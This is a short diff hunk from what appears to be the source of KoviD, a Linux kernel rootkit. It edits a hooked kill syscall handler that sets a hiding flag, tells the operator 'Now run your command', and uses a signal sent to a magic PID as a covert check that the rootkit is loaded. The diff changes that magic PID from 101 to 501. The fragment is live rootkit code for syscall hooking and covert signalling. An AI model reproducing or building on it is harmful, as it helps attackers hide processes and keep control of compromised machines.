@@ -152,7 +152,7 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 		hide_once = true;
 		spin_unlock(&hide_once_spin);
 		prinfo("Cool! Now run your command\n");
-	} else if (101 == pid && SIGCONT == sig) {
+	} else if (501 == pid && SIGCONT == sig) {
 		// for check kovid is loaded
         return EINVAL;
 	}
